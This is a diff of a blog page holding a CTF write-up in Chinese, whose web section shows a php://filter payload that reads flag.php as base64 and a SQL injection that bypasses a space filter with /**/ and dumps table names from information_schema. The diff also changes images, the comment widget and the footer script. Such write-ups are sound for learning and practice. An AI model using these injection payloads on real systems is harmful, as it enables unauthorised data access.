@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：16 天前
+                  本文最后更新于：5 天前
                 
               </p>
             
@@ -249,23 +249,20 @@
               <h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>
 
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>提示GET一个1,那就 url+?1</p>
-<p><img src="/2020/09/27/cumtctf/w1.png" srcset="/img/loading.gif" alt></p>
 <p>提示post一个2</p>
 <p>那就post一个</p>
 <p><strong>注意的是要2=任意字符才出现源码</strong></p>
-<p> <img src="/2020/09/27/cumtctf/w2.png" srcset="/img/loading.gif" alt></p>
 <p>审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，读取base64源码之后解码即可</p>
-<p><img src="/2020/09/27/cumtctf/w4.png" srcset="/img/loading.gif" alt></p>
 <p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p>
 <h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>首先判断是否存在注入<code>username=admin&amp;password=pw&#39;</code></p>
 <p>在后面加上单引号后出现报错提示，确认有注入点</p>
 <p>但是继续测试 <code>&#39;or 1=1 #</code>会出现</p>
-<p><img src="/2020/09/27/cumtctf/w2-1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/J6rdWUDupV4iTI5.png" srcset="/img/loading.gif" alt></p>
 <p>判断存在黑名单过滤。</p>
 <p>接下来就是判断是将什么加入黑名单了，经过字典测试发现是<strong>空格</strong>，这里可以使用/**/绕过。</p>
 <p>先测试有多少列，<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  到第七的时候，页面报错。</p>
 <p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> 到第八的时候显示下图，说明一共八列，并且第四列出现回显。</p>
-<p><img src="/2020/09/27/cumtctf/w2-2.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/bltS5moZHWkOEGF.png" srcset="/img/loading.gif" alt></p>
 <p><strong>爆表</strong></p>
 <div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>
 
@@ -490,7 +487,7 @@ print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>
   <div id="vcomments"></div>
   <script type="text/javascript">
     function loadValine() {
-      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
         new Valine({
           el: "#vcomments",
           app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
@@ -504,6 +501,9 @@ print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>
           highlight: true,
           recordIP: false,
           serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
         });
       });
     }
@@ -757,7 +757,43 @@ print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>
 
 
 
-
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
